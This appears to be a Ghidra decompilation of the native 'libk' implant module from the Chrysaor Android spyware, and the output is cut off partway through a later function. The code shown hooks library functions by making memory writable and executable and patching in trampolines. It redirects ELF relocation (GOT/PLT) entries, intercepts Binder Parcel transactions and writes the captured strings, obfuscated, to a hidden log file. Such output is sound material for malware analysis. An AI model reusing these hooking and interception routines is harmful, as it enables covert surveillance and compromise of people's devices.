/* Chrysaor native reassembly: libk / module implant */
/* Ghidra decompile - canonical sample ade8bef0... */

/* === FUN_0001494c @ 0x0001494c === */

void FUN_0001494c(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
                 undefined4 param_5,undefined4 param_6)

{
  FUN_00015618(param_3,param_4);
  (**(code **)(DAT_00014980 + 0x1496e))(param_1,param_2,param_3,param_4,param_5,param_6);
  return;
}

/* === FUN_00014984 @ 0x00014984 === */

void FUN_00014984(undefined4 param_1,undefined4 param_2,byte *param_3,int *param_4)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  void *__dest;
  undefined4 uVar4;
  byte *__src;
  int iVar5;
  byte *pbVar6;
  int *__src_00;
  int *piVar7;
  int iVar8;
  int iVar9;
  byte *local_38;
  int local_34;
  byte *local_30;
  int local_2c [2];
  
  iVar1 = DAT_00014bec;
  iVar5 = DAT_00014be8 + 0x1499a;
  local_2c[0] = **(int **)(iVar5 + DAT_00014bec);
  iVar2 = dlopen(param_1,1);
  if (iVar2 == 0) {
    __android_log_print(3,DAT_00014c34 + 0x14bc6,DAT_00014c38 + 0x14bc8);
    uVar4 = 0xffffffff;
  }
  else {
    uVar3 = dlsym(iVar2,param_2);
    if (uVar3 == 0) {
      __android_log_print(3,DAT_00014c3c + 0x14bda,DAT_00014c40 + 0x14bdc);
      uVar4 = 0xffffffff;
    }
    else {
      __src = (byte *)(uVar3 - ((int)uVar3 % 4 == 1));
      iVar9 = DAT_00014bf0 + 0x149e2;
      __android_log_print(3,iVar9,DAT_00014bf4 + 0x149e4,__src);
      __android_log_print(3,iVar9,DAT_00014bf8 + 0x149f6,(void *)(uVar3 & 0xfffff000));
      iVar2 = mprotect((void *)(uVar3 & 0xfffff000),0xc00,7);
      if (iVar2 == 0) {
        iVar8 = DAT_00014bfc + 0x14a1a;
        iVar2 = DAT_00014c00 + 0x14a24;
        pbVar6 = __src;
        do {
          uVar3 = (uint)*pbVar6;
          pbVar6 = pbVar6 + 1;
          __android_log_print(3,iVar9,iVar8,iVar2,uVar3);
        } while (pbVar6 != __src + 8);
        __src_00 = &local_34;
        local_34 = *(int *)(DAT_00014c04 + 0x14a46);
        local_30 = *(byte **)(DAT_00014c04 + 0x14a4a);
        __android_log_print(3,iVar9,DAT_00014c08 + 0x14a56,param_3,uVar3);
        __dest = malloc(0x10);
        __android_log_print(3,iVar9,DAT_00014c0c + 0x14a68,__dest);
        __android_log_print(3,iVar9,DAT_00014c10 + 0x14a7c,(void *)((uint)__dest & 0xfffff000));
        iVar2 = mprotect((void *)((uint)__dest & 0xfffff000),0xc00,7);
        if (iVar2 == 0) {
          memcpy(__dest,__src,8);
          memcpy((void *)((int)__dest + 8),__src_00,8);
          local_38 = __src + 9;
          memcpy((void *)((int)__dest + 0xc),&local_38,4);
          iVar2 = DAT_00014c14;
          __clear_cache(__dest,(int)__dest + 0x10);
          __android_log_print(3,iVar9,DAT_00014c18 + 0x14ae8);
          piVar7 = __src_00;
          do {
            iVar8 = *piVar7;
            piVar7 = (int *)((int)piVar7 + 1);
            __android_log_print(3,iVar9,iVar2 + 0x14af4,(char)iVar8);
          } while (piVar7 != local_2c);
          local_38 = param_3;
          local_30 = param_3;
          __android_log_print(3,iVar9,DAT_00014c1c + 0x14b2a);
          iVar2 = DAT_00014c20 + 0x14b38;
          do {
            iVar8 = *__src_00;
            __src_00 = (int *)((int)__src_00 + 1);
            __android_log_print(3,iVar9,iVar2,(char)iVar8);
          } while (__src_00 != local_2c);
          *(int *)__src = local_34;
          *(byte **)(__src + 4) = local_30;
          __android_log_print(3,iVar9,DAT_00014c24 + 0x14b5e);
          __clear_cache(__src,__src + 0x20);
          __android_log_print(3,iVar9,DAT_00014c28 + 0x14b74);
          uVar4 = 0;
          if (*param_4 == 0) {
            *param_4 = (int)__dest + 1;
          }
          goto LAB_00014b80;
        }
        iVar2 = DAT_00014c2c + 0x14baa;
      }
      else {
        iVar2 = DAT_00014c30 + 0x14bbc;
      }
      __android_log_print(3,iVar9,iVar2);
      uVar4 = 0xffffffff;
    }
  }
LAB_00014b80:
  if (local_2c[0] == **(int **)(iVar5 + iVar1)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail(uVar4);
}

/* === FUN_00014c44 @ 0x00014c44 === */

int FUN_00014c44(void)

{
  int iVar1;
  int *piVar2;
  char *pcVar3;
  
  iVar1 = FUN_00014984();
  if (iVar1 == -1) {
    piVar2 = (int *)__errno();
    pcVar3 = strerror(*piVar2);
    __android_log_print(3,DAT_00014c70 + 0x14c68,DAT_00014c74 + 0x14c6a,pcVar3);
  }
  return iVar1;
}

/* === init @ 0x00014c78 === */

int init(EVP_PKEY_CTX *ctx)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  
  iVar2 = DAT_00014cdc;
  iVar3 = DAT_00014cd4 + 0x14c84;
  iVar4 = DAT_00014cdc + 0x14c8c;
  __android_log_print(3,iVar3,DAT_00014cd8 + 0x14c86);
  iVar1 = DAT_00014ce0;
  if (*(int *)(iVar2 + 0x14c90) == 1) {
    iVar2 = __android_log_print(3,iVar3,DAT_00014cf4 + 0x14cce);
  }
  else {
    *(undefined4 *)(iVar2 + 0x14c90) = 1;
    __android_log_print(3,iVar3,iVar1 + 0x14c9e);
    FUN_00014c44(DAT_00014ce4 + 0x14cae,DAT_00014ce8 + 0x14cb0,DAT_00014cec + 0x14cb2,iVar4);
    iVar2 = __android_log_print(3,iVar3,DAT_00014cf0 + 0x14cc0);
  }
  return iVar2;
}

/* === FUN_00014cf8 @ 0x00014cf8 === */

undefined4 FUN_00014cf8(int param_1,int param_2,undefined4 *param_3)

{
  undefined4 uVar1;
  void *pvVar2;
  __off_t _Var3;
  ssize_t sVar4;
  undefined4 *puVar5;
  
  uVar1 = 0x16;
  if (param_2 != 0) {
    pvVar2 = malloc(*(size_t *)(param_2 + 0x14));
    *param_3 = pvVar2;
    _Var3 = lseek(param_1,*(__off_t *)(param_2 + 0x10),0);
    if (_Var3 < 0) {
      free((void *)*param_3);
      puVar5 = (undefined4 *)__errno();
      uVar1 = *puVar5;
    }
    else {
      sVar4 = read(param_1,(void *)*param_3,*(size_t *)(param_2 + 0x14));
      uVar1 = 0;
      if (sVar4 < 1) {
        free((void *)*param_3);
        puVar5 = (undefined4 *)__errno();
        *puVar5 = 0x16;
        uVar1 = 0x16;
      }
    }
  }
  return uVar1;
}

/* === FUN_00014d50 @ 0x00014d50 === */

undefined4 FUN_00014d50(int param_1,int param_2,undefined4 *param_3)

{
  undefined4 uVar1;
  void *pvVar2;
  __off_t _Var3;
  ssize_t sVar4;
  undefined4 *puVar5;
  
  uVar1 = 0x16;
  if (param_2 != 0) {
    pvVar2 = malloc(*(size_t *)(param_2 + 0x14));
    *param_3 = pvVar2;
    _Var3 = lseek(param_1,*(__off_t *)(param_2 + 0x10),0);
    if (_Var3 < 0) {
      free((void *)*param_3);
      puVar5 = (undefined4 *)__errno();
      uVar1 = *puVar5;
    }
    else {
      sVar4 = read(param_1,(void *)*param_3,*(size_t *)(param_2 + 0x14));
      uVar1 = 0;
      if (sVar4 < 1) {
        free((void *)*param_3);
        puVar5 = (undefined4 *)__errno();
        *puVar5 = 0x16;
        uVar1 = 0x16;
      }
    }
  }
  return uVar1;
}

/* === FUN_00014da8 @ 0x00014da8 === */

undefined4 FUN_00014da8(int param_1,int param_2,undefined4 *param_3)

{
  undefined4 uVar1;
  void *pvVar2;
  __off_t _Var3;
  ssize_t sVar4;
  undefined4 *puVar5;
  
  uVar1 = 0x16;
  if (param_2 != 0) {
    pvVar2 = malloc(*(size_t *)(param_2 + 0x14));
    *param_3 = pvVar2;
    _Var3 = lseek(param_1,*(__off_t *)(param_2 + 0x10),0);
    if (_Var3 < 0) {
      free((void *)*param_3);
      puVar5 = (undefined4 *)__errno();
      uVar1 = *puVar5;
    }
    else {
      sVar4 = read(param_1,(void *)*param_3,*(size_t *)(param_2 + 0x14));
      uVar1 = 0;
      if (sVar4 < 1) {
        free((void *)*param_3);
        puVar5 = (undefined4 *)__errno();
        *puVar5 = 0x16;
        uVar1 = 0x16;
      }
    }
  }
  return uVar1;
}

/* === FUN_00014e00 @ 0x00014e00 === */

undefined4 FUN_00014e00(int param_1,int param_2,undefined4 *param_3)

{
  undefined4 uVar1;
  void *pvVar2;
  __off_t _Var3;
  ssize_t sVar4;
  undefined4 *puVar5;
  size_t __size;
  
  uVar1 = 0x16;
  if (param_2 != 0) {
    __size = (uint)*(ushort *)(param_2 + 0x30) * 0x28;
    pvVar2 = malloc(__size);
    *param_3 = pvVar2;
    _Var3 = lseek(param_1,*(__off_t *)(param_2 + 0x20),0);
    if (_Var3 < 0) {
      free((void *)*param_3);
      puVar5 = (undefined4 *)__errno();
      uVar1 = *puVar5;
    }
    else {
      sVar4 = read(param_1,(void *)*param_3,__size);
      uVar1 = 0;
      if (sVar4 < 1) {
        free((void *)*param_3);
        puVar5 = (undefined4 *)__errno();
        *puVar5 = 0x16;
        uVar1 = 0x16;
      }
    }
  }
  return uVar1;
}

/* === FUN_00014e60 @ 0x00014e60 === */

undefined4 FUN_00014e60(int param_1,undefined4 *param_2)

{
  void *pvVar1;
  __off_t _Var2;
  ssize_t sVar3;
  undefined4 uVar4;
  undefined4 *puVar5;
  
  pvVar1 = malloc(0x34);
  *param_2 = pvVar1;
  _Var2 = lseek(param_1,0,0);
  if (_Var2 < 0) {
    free((void *)*param_2);
    puVar5 = (undefined4 *)__errno();
    uVar4 = *puVar5;
  }
  else {
    sVar3 = read(param_1,(void *)*param_2,0x34);
    uVar4 = 0;
    if (sVar3 < 1) {
      free((void *)*param_2);
      puVar5 = (undefined4 *)__errno();
      *puVar5 = 0x16;
      uVar4 = 0x16;
    }
  }
  return uVar4;
}

/* === FUN_00014eb0 @ 0x00014eb0 === */

undefined4 FUN_00014eb0(undefined4 param_1,char *param_2,undefined4 *param_3)

{
  ushort uVar1;
  int *piVar2;
  int iVar3;
  undefined4 *puVar4;
  undefined4 uVar5;
  void *pvVar6;
  int *piVar7;
  uint uVar8;
  void *__ptr;
  void *local_34;
  int *local_30;
  void *local_2c [2];
  
  local_2c[0] = (void *)0x0;
  local_30 = (int *)0x0;
  local_34 = (void *)0x0;
  *param_3 = 0;
  iVar3 = FUN_00014e60(param_1,local_2c);
  if (((iVar3 == 0) && (iVar3 = FUN_00014e00(param_1,local_2c[0],&local_30), iVar3 == 0)) &&
     (iVar3 = FUN_00014da8(param_1,local_30 + (uint)*(ushort *)((int)local_2c[0] + 0x32) * 10,
                           &local_34), __ptr = local_2c[0], piVar2 = local_30, pvVar6 = local_34,
     iVar3 == 0)) {
    uVar1 = *(ushort *)((int)local_2c[0] + 0x30);
    if (uVar1 != 0) {
      uVar8 = 0;
      piVar7 = local_30;
      do {
        iVar3 = strcmp(param_2,(char *)(*piVar7 + (int)pvVar6));
        if (iVar3 == 0) {
          pvVar6 = malloc(0x28);
          *param_3 = pvVar6;
          if (pvVar6 == (void *)0x0) {
            free(local_2c[0]);
            free(local_30);
            free(local_34);
            goto LAB_00014ee6;
          }
          memcpy(pvVar6,(void *)((int)local_30 + ((int)piVar7 - (int)piVar2)),0x28);
          __ptr = local_2c[0];
          break;
        }
        uVar8 = uVar8 + 1;
        piVar7 = piVar7 + 10;
      } while (uVar8 < uVar1);
    }
    free(__ptr);
    free(local_30);
    free(local_34);
    uVar5 = 0;
  }
  else {
LAB_00014ee6:
    puVar4 = (undefined4 *)__errno();
    uVar5 = *puVar4;
  }
  return uVar5;
}

/* === FUN_00014f8c @ 0x00014f8c === */

undefined4 FUN_00014f8c(undefined4 param_1,int param_2,undefined4 *param_3)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  void *__dest;
  uint uVar4;
  void *local_20;
  void *local_1c [2];
  
  local_1c[0] = (void *)0x0;
  local_20 = (void *)0x0;
  *param_3 = 0;
  iVar2 = FUN_00014e60(param_1,local_1c);
  if ((iVar2 == 0) && (iVar2 = FUN_00014e00(param_1,local_1c[0],&local_20), iVar2 == 0)) {
    if (*(ushort *)((int)local_1c[0] + 0x30) == 0) {
LAB_00014fde:
      free(local_1c[0]);
      free(local_20);
      return 0;
    }
    iVar2 = 0;
    if (*(int *)((int)local_20 + 4) != param_2) {
      uVar4 = 0;
      iVar1 = 0x28;
      do {
        iVar2 = iVar1;
        uVar4 = uVar4 + 1;
        if (*(ushort *)((int)local_1c[0] + 0x30) <= uVar4) goto LAB_00014fde;
        iVar1 = iVar2 + 0x28;
      } while (*(int *)((int)local_20 + iVar2 + 4) != param_2);
    }
    __dest = malloc(0x28);
    *param_3 = __dest;
    if (__dest != (void *)0x0) {
      memcpy(__dest,(void *)((int)local_20 + iVar2),0x28);
      free(local_1c[0]);
      free(local_20);
      return 0;
    }
    free(local_1c[0]);
    free(local_20);
  }
  puVar3 = (undefined4 *)__errno();
  return *puVar3;
}

/* === FUN_0001502c @ 0x0001502c === */

undefined4 FUN_0001502c(undefined4 param_1,uint param_2,undefined4 *param_3)

{
  int iVar1;
  void *__dest;
  undefined4 *puVar2;
  void *local_18;
  void *local_14;
  
  local_14 = (void *)0x0;
  local_18 = (void *)0x0;
  *param_3 = 0;
  iVar1 = FUN_00014e60(param_1,&local_14);
  if ((iVar1 == 0) && (iVar1 = FUN_00014e00(param_1,local_14,&local_18), iVar1 == 0)) {
    if (*(ushort *)((int)local_14 + 0x30) <= param_2) {
      return 0x16;
    }
    __dest = malloc(0x28);
    *param_3 = __dest;
    if (__dest != (void *)0x0) {
      memcpy(__dest,(void *)((int)local_18 + param_2 * 0x28),0x28);
      free(local_14);
      free(local_18);
      return 0;
    }
    free(local_14);
    free(local_18);
  }
  puVar2 = (undefined4 *)__errno();
  return *puVar2;
}

/* === FUN_000150a4 @ 0x000150a4 === */

undefined4
FUN_000150a4(undefined4 param_1,int param_2,char *param_3,undefined4 *param_4,uint *param_5)

{
  int iVar1;
  undefined4 *puVar2;
  undefined4 uVar3;
  void *pvVar4;
  uint uVar5;
  uint uVar6;
  int *piVar7;
  int *local_2c;
  void *local_28;
  void *local_24;
  
  local_24 = (void *)0x0;
  local_28 = (void *)0x0;
  local_2c = (int *)0x0;
  *param_4 = 0;
  *param_5 = 0;
  iVar1 = FUN_0001502c(param_1,*(undefined4 *)(param_2 + 0x18),&local_24);
  if (((iVar1 == 0) && (iVar1 = FUN_00014da8(param_1,local_24,&local_28), iVar1 == 0)) &&
     (iVar1 = FUN_00014d50(param_1,param_2,&local_2c), pvVar4 = local_28, iVar1 == 0)) {
    uVar5 = *(uint *)(param_2 + 0x14) >> 4;
    if (uVar5 != 0) {
      uVar6 = 0;
      piVar7 = local_2c;
      do {
        iVar1 = strcmp(param_3,(char *)(*piVar7 + (int)pvVar4));
        if (iVar1 == 0) {
          pvVar4 = malloc(0x10);
          *param_4 = pvVar4;
          if (pvVar4 == (void *)0x0) {
            free(local_24);
            free(local_28);
            free(local_2c);
            goto LAB_000150e2;
          }
          memcpy(pvVar4,local_2c + uVar6 * 4,0x10);
          *param_5 = uVar6;
          break;
        }
        uVar6 = uVar6 + 1;
        piVar7 = piVar7 + 4;
      } while (uVar6 != uVar5);
    }
    free(local_24);
    free(local_28);
    free(local_2c);
    uVar3 = 0;
  }
  else {
LAB_000150e2:
    puVar2 = (undefined4 *)__errno();
    uVar3 = *puVar2;
  }
  return uVar3;
}

/* === FUN_00015174 @ 0x00015174 === */

int FUN_00015174(char *param_1,void *param_2,int param_3,int param_4)

{
  int iVar1;
  int iVar2;
  long lVar3;
  int *piVar4;
  size_t sVar5;
  int *piVar6;
  uint uVar7;
  uint uVar8;
  int iVar9;
  uint uVar10;
  int *piVar11;
  long *plVar12;
  size_t *psVar13;
  uint local_3c;
  void *local_38;
  void *local_34;
  void *local_30;
  void *local_2c [2];
  
  if (((param_3 != 0) && (param_2 != (void *)0x0)) && (param_4 != 0)) {
    local_2c[0] = (void *)0x0;
    plVar12 = (long *)(DAT_00015414 + 0x151b4);
    local_30 = (void *)0x0;
    local_34 = (void *)0x0;
    local_38 = (void *)0x0;
    if (*plVar12 == 0) {
      lVar3 = sysconf(0x27);
      *plVar12 = lVar3;
    }
    iVar1 = open(param_1,0);
    if (-1 < iVar1) {
      iVar2 = FUN_00014f8c(iVar1,0xb,local_2c);
      if (((iVar2 != 0) ||
          (iVar2 = FUN_000150a4(iVar1,local_2c[0],param_3,&local_38,&local_3c), iVar2 != 0)) ||
         ((iVar2 = FUN_00014eb0(iVar1,DAT_00015418 + 0x151fe,&local_30), iVar2 != 0 ||
          (iVar2 = FUN_00014eb0(iVar1,DAT_0001541c + 0x15210,&local_34), iVar2 != 0)))) {
        free(local_2c[0]);
        free(local_30);
        free(local_34);
        free(local_38);
        close(iVar1);
        return 0;
      }
      if (local_3c == 0) {
        __android_log_print(2,DAT_00015458 + 0x15382,DAT_0001545c + 0x15384,param_3);
        return 0;
      }
      free(local_2c[0]);
      free(local_38);
      uVar7 = *(uint *)((int)local_30 + 0x14) >> 3;
      piVar11 = (int *)((int)param_2 + *(int *)((int)local_30 + 0xc));
      uVar8 = *(uint *)((int)local_34 + 0x14);
      piVar6 = (int *)(*(int *)((int)local_34 + 0xc) + (int)param_2);
      free(local_30);
      free(local_34);
      close(iVar1);
      if (uVar7 != 0) {
        uVar10 = 0;
        iVar1 = DAT_00015420 + 0x1526a;
        iVar2 = DAT_00015424 + 0x1526c;
        do {
          __android_log_print(2,iVar2,iVar1);
          if ((uint)piVar11[1] >> 8 == local_3c) {
            __android_log_print(2,iVar2,DAT_00015428 + 0x152a0);
            iVar9 = *(int *)((int)param_2 + *piVar11);
            iVar1 = mprotect(param_2,*piVar11 + 8,7);
            if (iVar1 == -1) {
              __android_log_print(2,iVar2,DAT_00015460 + 0x15396);
              iVar9 = *(int *)((int)param_2 + *piVar11);
              __android_log_print(2,iVar2,DAT_00015464 + 0x153a2);
            }
            iVar2 = DAT_00015430;
            iVar1 = DAT_0001542c;
            *(int *)((int)param_2 + *piVar11) = param_4;
            __android_log_print(2,iVar1 + 0x152c6,iVar2 + 0x152c8);
            if (iVar9 != 0) {
              return iVar9;
            }
            goto LAB_000152d2;
          }
          uVar10 = uVar10 + 1;
          piVar11 = piVar11 + 2;
        } while (uVar10 != uVar7);
      }
      __android_log_print(2,DAT_00015450 + 0x15372,DAT_00015454 + 0x15374);
LAB_000152d2:
      uVar8 = uVar8 >> 3;
      __android_log_print(2,DAT_00015434 + 0x152e2,DAT_00015438 + 0x152e0);
      iVar1 = 0;
      if (uVar8 != 0) {
        iVar9 = DAT_0001543c + 0x152f8;
        iVar2 = DAT_00015440 + 0x152fe;
        uVar7 = 0;
        psVar13 = (size_t *)(DAT_00015444 + 0x1530c);
        iVar1 = 0;
        do {
          if ((uint)piVar6[1] >> 8 == local_3c) {
            piVar11 = (int *)(*piVar6 + (int)param_2);
            __android_log_print(2,iVar9,iVar2,piVar11,(uint)piVar6[1] >> 8);
            if (iVar1 == 0) {
              iVar1 = (int)piVar11 + *piVar11 + 4;
            }
            sVar5 = *psVar13;
            mprotect((void *)(-sVar5 & (uint)piVar11),sVar5,3);
            piVar4 = (int *)__errno();
            if (*piVar4 != 0) {
              return 0;
            }
            *piVar11 = (param_4 - (int)piVar11) + -4;
            sVar5 = *psVar13;
            mprotect((void *)(-sVar5 & (uint)piVar11),sVar5,5);
            piVar4 = (int *)__errno();
            if (*piVar4 != 0) {
              *piVar11 = (iVar1 - (int)piVar11) + -4;
              return 0;
            }
          }
          uVar7 = uVar7 + 1;
          piVar6 = piVar6 + 2;
        } while (uVar7 != uVar8);
      }
      __android_log_print(2,DAT_00015448 + 0x1532c,DAT_0001544c + 0x1532e,iVar1);
      return iVar1;
    }
  }
  return 0;
}

/* === FUN_0001548c @ 0x0001548c === */

void FUN_0001548c(void)

{
  int iVar1;
  time_t tVar2;
  int iVar3;
  char *__file;
  stat sStack_188;
  char acStack_11c [256];
  int local_1c;
  
  iVar1 = DAT_00015508;
  iVar3 = DAT_00015504 + 0x1549c;
  __file = (char *)(DAT_0001550c + 0x154a2);
  local_1c = **(int **)(iVar3 + DAT_00015508);
  stat(__file,&sStack_188);
  if (0x32 < (uint)sStack_188.st_blksize) {
    tVar2 = time((time_t *)0x0);
    memset(acStack_11c,0,0x100);
    sprintf(acStack_11c,(char *)(DAT_00015510 + 0x154d2),tVar2);
    rename(__file,acStack_11c);
    __android_log_print(3,DAT_00015514 + 0x154e6,DAT_00015518 + 0x154e8,acStack_11c);
  }
  if (local_1c == **(int **)(iVar3 + iVar1)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}

/* === FUN_0001551c @ 0x0001551c === */

void FUN_0001551c(int param_1,byte *param_2)

{
  FILE *pFVar1;
  int iVar2;
  byte *pbVar3;
  char *__filename;
  int iVar4;
  byte local_21 [5];
  
  iVar2 = DAT_000155ec + 0x1552e;
  __android_log_print(3,iVar2,DAT_000155f0 + 0x15534,param_1);
  iVar4 = DAT_000155f4;
  if (param_1 != 0) {
    FUN_0001548c();
    __filename = (char *)(iVar4 + 0x15556);
    pFVar1 = fopen(__filename,(char *)(DAT_000155f8 + 0x1555a));
    if (pFVar1 == (FILE *)0x0) {
      pFVar1 = fopen(__filename,(char *)(DAT_00015610 + 0x155d6));
      if (pFVar1 == (FILE *)0x0) {
        __android_log_print(3,iVar2,DAT_00015614 + 0x155e8);
        return;
      }
    }
    else {
      fclose(pFVar1);
      pFVar1 = fopen(__filename,(char *)(DAT_000155fc + 0x1556c));
    }
    if (0 < param_1 * 2) {
      pbVar3 = param_2 + param_1 * 2;
      iVar4 = DAT_00015600 + 0x15588;
      iVar2 = DAT_00015604 + 0x1558a;
      do {
        local_21[0] = ~*param_2;
        __android_log_print(3,iVar4,iVar2,(int)(char)local_21[0]);
        param_2 = param_2 + 1;
        fwrite(local_21,1,1,pFVar1);
      } while (param_2 != pbVar3);
    }
    fflush(pFVar1);
    fclose(pFVar1);
    __android_log_print(3,DAT_00015608 + 0x155c8,DAT_0001560c + 0x155ca);
  }
  return;
}

/* === FUN_00015618 @ 0x00015618 === */

void FUN_00015618(int param_1,String16 *param_2)

{
  int iVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  undefined4 uVar4;
  undefined2 *local_20;
  String16 aSStack_1c [4];
  
  android::Parcel::data();
  android::Parcel::dataSize();
  if ((param_1 == 8) || (param_1 == 6)) {
    android::Parcel::setDataPosition((uint)param_2);
    android::String16::String16(aSStack_1c,(char *)(DAT_000156e0 + 0x15652));
    iVar1 = android::Parcel::enforceInterface(param_2,(IPCThreadState *)aSStack_1c);
    if (iVar1 != 0) {
      uVar2 = android::Parcel::readInt32();
      uVar3 = android::Parcel::readInt32();
      uVar4 = android::Parcel::dataPosition();
      __android_log_print(3,DAT_000156e4 + 0x15686,DAT_000156e8 + 0x15688,param_1,uVar2,uVar3,uVar4)
      ;
      android::Parcel::readString16();
      __android_log_print(3,DAT_000156ec + 0x156a6,DAT_000156f0 + 0x156a8,*local_20,local_20);
      uVar2 = strlen16(local_20);
      FUN_0001551c(uVar2,local_20);
      android::String16::~String16((String16 *)&local_20);
    }
    android::String16::~String16(aSStack_1c);
  }
  return;
}

/* === FUN_00015bb8 @ 0x00015bb8 === */

void FUN_00015bb8(void)

{
  int iVar1;
  int iVar2;
  char cVar3;
  uint uVar4;
  undefined4 uVar5;
  undefined4 uVar6;
  pthread_key_t *__key;
  
  iVar2 = DAT_00015c08;
  iVar1 = DAT_00015c04;
  __key = (pthread_key_t *)(DAT_00015c04 + 0x15bcc);
  *(undefined1 *)(DAT_00015c04 + 0x15bd0) = 0;
  uVar4 = pthread_key_create(__key,(__destr_function *)(iVar2 + 0x15bd8));
  uVar5 = *(undefined4 *)(DAT_00015c0c + 0x15be8);
  uVar6 = *(undefined4 *)(DAT_00015c10 + 0x15bf0);
  cVar3 = '\x01' - (char)uVar4;
  if (1 < uVar4) {
    cVar3 = '\0';
  }
  *(char *)(iVar1 + 0x15bd0) = cVar3;
  (*(code *)PTR___aeabi_atexit_0001a7f4)(__key,uVar5,uVar6);
  return;
}

/* === FUN_00015c14 @ 0x00015c14 === */

void FUN_00015c14(int *param_1)

{
  int iVar1;
  int iVar2;
  
  if (param_1 != (int *)0x0) {
    iVar1 = *param_1;
    while (iVar1 != 0) {
      iVar2 = *(int *)(iVar1 + 0x10);
      _Unwind_DeleteException(iVar1 + 0x20);
      iVar1 = iVar2;
    }
    free(param_1);
    return;
  }
  return;
}

/* === ~__eh_globals_init @ 0x00015c4c === */

/* __eh_globals_init::~__eh_globals_init() */

__eh_globals_init * __thiscall __eh_globals_init::~__eh_globals_init(__eh_globals_init *this)

{
  if (this != (__eh_globals_init *)0x0) {
    if (this[4] != (__eh_globals_init)0x0) {
      pthread_key_delete(*(pthread_key_t *)this);
    }
    this[4] = (__eh_globals_init)0x0;
  }
  return this;
}

/* === FUN_00015d58 @ 0x00015d58 === */

void FUN_00015d58(byte *param_1,uint *param_2)

{
  byte bVar1;
  uint uVar2;
  uint uVar3;
  
  uVar3 = 0;
  uVar2 = 0;
  do {
    bVar1 = *param_1;
    uVar3 = uVar3 | (bVar1 & 0x7f) << (uVar2 & 0xff);
    uVar2 = uVar2 + 7;
    param_1 = param_1 + 1;
  } while ((bVar1 & 0x80) != 0);
  if ((uVar2 < 0x20) && ((bVar1 & 0x40) != 0)) {
    uVar3 = uVar3 | -1 << (uVar2 & 0xff);
  }
  *param_2 = uVar3;
  return;
}

/* === FUN_00015d9c @ 0x00015d9c === */

undefined4 FUN_00015d9c(uint param_1,undefined4 param_2)

{
  undefined4 uVar1;
  
  if (param_1 != 0xff) {
    param_1 = param_1 & 0x70;
    if (param_1 == 0x20) {
      uVar1 = (*(code *)PTR__Unwind_GetTextRelBase_0001a844)(param_2);
      return uVar1;
    }
    if (param_1 < 0x21) {
      if ((param_1 != 0) && (param_1 != 0x10)) {
                    /* WARNING: Subroutine does not return */
        abort();
      }
    }
    else {
      if (param_1 == 0x40) {
        uVar1 = _Unwind_GetRegionStart(param_2);
        return uVar1;
      }
      if (param_1 != 0x50) {
        if (param_1 != 0x30) {
                    /* WARNING: Subroutine does not return */
          abort();
        }
        uVar1 = (*(code *)PTR__Unwind_GetDataRelBase_0001a864)(param_2);
        return uVar1;
      }
    }
  }
  return 0;
}

/* === FUN_00015e14 @ 0x00015e14 === */

void FUN_00015e14(int param_1,byte *param_2,undefined4 *param_3)

{
  byte bVar1;
  byte bVar2;
  undefined4 uVar3;
  byte *pbVar4;
  uint uVar5;
  uint uVar6;
  byte *pbVar7;
  byte *pbVar8;
  byte *local_24 [2];
  
  if (param_1 == 0) {
    uVar3 = 0;
  }
  else {
    uVar3 = _Unwind_GetRegionStart();
  }
  *param_3 = uVar3;
  pbVar7 = param_2 + 1;
  bVar1 = *param_2;
  if (bVar1 == 0xff) {
    param_3[1] = uVar3;
    pbVar8 = pbVar7;
    goto LAB_00015eac;
  }
  pbVar4 = (byte *)FUN_00015d9c(bVar1,param_1);
  if (bVar1 == 0x50) {
    param_3[1] = *(undefined4 *)((uint)(param_2 + 4) & 0xfffffffc);
    pbVar8 = (byte *)((undefined4 *)((uint)(param_2 + 4) & 0xfffffffc) + 1);
    goto LAB_00015eac;
  }
  switch(bVar1 & 0xf) {
  case 0:
    goto LAB_00015f34;
  case 1:
    local_24[0] = (byte *)0x0;
    uVar5 = 0;
    do {
      pbVar8 = param_2;
      param_2 = pbVar8 + 1;
      bVar2 = *param_2;
      local_24[0] = (byte *)((uint)local_24[0] | (bVar2 & 0x7f) << (uVar5 & 0xff));
      uVar5 = uVar5 + 7;
    } while ((bVar2 & 0x80) != 0);
    pbVar8 = pbVar8 + 2;
    break;
  case 2:
    pbVar8 = param_2 + 3;
    local_24[0] = (byte *)(uint)*(ushort *)(param_2 + 1);
    break;
  case 3:
    goto LAB_00015f34;
  case 4:
    goto LAB_00015f90;
  case 5:
  default:
switchD_00015e6c_default:
                    /* WARNING: Subroutine does not return */
    abort();
  case 6:
    goto switchD_00015e6c_default;
  case 7:
    goto switchD_00015e6c_default;
  case 8:
    goto switchD_00015e6c_default;
  case 9:
    pbVar8 = (byte *)FUN_00015d58(pbVar7,local_24);
    break;
  case 10:
    pbVar8 = param_2 + 3;
    local_24[0] = (byte *)(int)*(short *)(param_2 + 1);
    break;
  case 0xb:
LAB_00015f34:
    local_24[0] = *(byte **)(param_2 + 1);
    pbVar8 = param_2 + 5;
    break;
  case 0xc:
LAB_00015f90:
    local_24[0] = *(byte **)(param_2 + 1);
    pbVar8 = param_2 + 9;
  }
  if (local_24[0] != (byte *)0x0) {
    if ((bVar1 & 0x70) == 0x10) {
      pbVar4 = pbVar7;
    }
    local_24[0] = local_24[0] + (int)pbVar4;
    if ((bVar1 & 0x80) != 0) {
      local_24[0] = *(byte **)local_24[0];
    }
  }
  param_3[1] = local_24[0];
LAB_00015eac:
  pbVar7 = pbVar8 + 1;
  bVar1 = *pbVar8;
  *(byte *)(param_3 + 5) = bVar1;
  if (bVar1 == 0xff) {
    param_3[3] = 0;
  }
  else {
    uVar5 = 0;
    uVar6 = 0;
    do {
      pbVar7 = pbVar8;
      pbVar8 = pbVar7 + 1;
      bVar1 = *pbVar8;
      uVar5 = uVar5 | (bVar1 & 0x7f) << (uVar6 & 0xff);
      uVar6 = uVar6 + 7;
    } while ((bVar1 & 0x80) != 0);
    pbVar7 = pbVar7 + 2;
    param_3[3] = pbVar7 + uVar5;
  }
  uVar5 = 0;
  uVar6 = 0;
  *(byte *)((int)param_3 + 0x15) = *pbVar7;
  do {
    pbVar8 = pbVar7;
    pbVar7 = pbVar8 + 1;
    bVar1 = *pbVar7;
